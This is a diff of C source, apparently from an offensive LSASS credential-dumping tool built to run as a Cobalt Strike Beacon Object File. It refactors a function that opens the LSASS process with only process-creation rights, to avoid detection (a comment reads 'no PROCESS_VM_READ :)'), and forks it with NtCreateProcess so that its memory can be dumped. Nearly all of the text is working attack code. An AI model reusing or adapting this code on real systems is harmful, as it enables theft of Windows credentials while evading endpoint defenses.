@@ -337,113 +337,6 @@ BOOL enable_debug_priv(void)
     return TRUE;
 }
 
-HANDLE fork_lsass_process(
-    DWORD dwPid
-)
-{
-    NTSTATUS status;
-    HANDLE hProcess = NULL;
-    OBJECT_ATTRIBUTES ObjectAttributes;
-
-    InitializeObjectAttributes(
-        &ObjectAttributes,
-        NULL,
-        0,
-        NULL,
-        NULL
-    );
-    CLIENT_ID uPid = { 0 };
-
-    uPid.UniqueProcess = (HANDLE)(DWORD_PTR)dwPid;
-    uPid.UniqueThread = (HANDLE)0;
-
-    // no PROCESS_VM_READ :)
-    DWORD dwFlags = PROCESS_CREATE_PROCESS;
-
-    status = NtOpenProcess(
-        &hProcess,
-        dwFlags,
-        &ObjectAttributes,
-        &uPid
-    );
-
-    if (status == STATUS_INVALID_CID)
-    {
-#ifdef BOF
-        BeaconPrintf(CALLBACK_ERROR,
-#else
-        printf(
-#endif
-            "There is no process with the PID %ld.\n",
-            dwPid
-        );
-        return NULL;
-    }
-    if (status == STATUS_ACCESS_DENIED)
-    {
-#ifdef BOF
-        BeaconPrintf(CALLBACK_ERROR,
-#else
-        printf(
-#endif
-            "Could not open a handle to %ld\n",
-            dwPid
-        );
-        return NULL;
-    }
-    else if (!NT_SUCCESS(status))
-    {
-#ifdef BOF
-        BeaconPrintf(CALLBACK_ERROR,
-#else
-        printf(
-#endif
-            "Failed to call NtOpenProcess, status: 0x%lx\n",
-            status
-        );
-        return NULL;
-    }
-
-    // fork the LSASS process
-    HANDLE hCloneProcess = NULL;
-    OBJECT_ATTRIBUTES CloneObjectAttributes;
-
-    InitializeObjectAttributes(
-        &CloneObjectAttributes,
-        NULL,
-        OBJ_CASE_INSENSITIVE,
-        NULL,
-        NULL
-    );
-
-    status = NtCreateProcess(
-        &hCloneProcess,
-        GENERIC_ALL,
-        &CloneObjectAttributes,
-        hProcess,
-        TRUE,
-        NULL,
-        NULL,
-        NULL
-    );
-
-    NtClose(hProcess); hProcess = NULL;
-    if (!NT_SUCCESS(status))
-    {
-#ifdef BOF
-        BeaconPrintf(CALLBACK_ERROR,
-#else
-        printf(
-#endif
-            "Failed to call NtCreateProcess, status: 0x%lx\n",
-            status
-        );
-        return NULL;
-    }
-
-    return hCloneProcess;
-}
-
 HANDLE get_process_handle(
     DWORD dwPid,
     DWORD dwFlags,
@@ -520,6 +413,59 @@ HANDLE get_process_handle(
     }
 
     return hProcess;
+}
+
+HANDLE fork_lsass_process(
+    DWORD dwPid
+)
+{
+    // open handle to LSASS with PROCESS_CREATE_PROCESS
+    HANDLE hProcess = get_process_handle(
+        dwPid,
+        PROCESS_CREATE_PROCESS,
+        FALSE
+    );
+    if (!hProcess)
+        return NULL;
+
+    // fork the LSASS process
+    HANDLE hCloneProcess = NULL;
+    OBJECT_ATTRIBUTES CloneObjectAttributes;
+
+    InitializeObjectAttributes(
+        &CloneObjectAttributes,
+        NULL,
+        OBJ_CASE_INSENSITIVE,
+        NULL,
+        NULL
+    );
+
+    NTSTATUS status = NtCreateProcess(
+        &hCloneProcess,
+        GENERIC_ALL,
+        &CloneObjectAttributes,
+        hProcess,
+        TRUE,
+        NULL,
+        NULL,
+        NULL
+    );
+    NtClose(hProcess); hProcess = NULL;
+
+    if (!NT_SUCCESS(status))
+    {
+#ifdef BOF
+        BeaconPrintf(CALLBACK_ERROR,
+#else
+        printf(
+#endif
+            "Failed to call NtCreateProcess, status: 0x%lx\n",
+            status
+        );
+        return NULL;
+    }
+
+    return hCloneProcess;
 }
 
 ULONG32 convert_to_little_endian(
